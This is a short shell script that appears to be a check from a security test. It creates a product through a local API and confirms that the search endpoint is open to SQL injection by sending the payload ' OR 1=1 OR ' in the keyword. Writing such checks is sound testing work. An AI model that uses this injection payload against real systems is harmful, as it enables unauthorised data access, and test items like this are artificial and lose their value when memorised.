#!/bin/sh
# The product search builds its SQL from the keyword: after adding a product, a keyword that
# matches nothing finds nothing, and the same keyword followed by ' OR 1=1 OR ' finds it.
n="check$$"
curl -s -o /dev/null -H 'Content-Type: application/json' \
  -d "{\"name\":\"$n\",\"description\":\"check\",\"skuId\":\"$n\",\"unitPrice\":1}" \
  http://api:5000/api/products
plain=$(curl -s "http://api:5000/api/products/search?keyword=nomatch$$")
injected=$(curl -s "http://api:5000/api/products/search?keyword=nomatch$$%27%20OR%201%3D1%20OR%20%27")
[ "$plain" = "[]" ] && echo "$injected" | grep -q "$n"
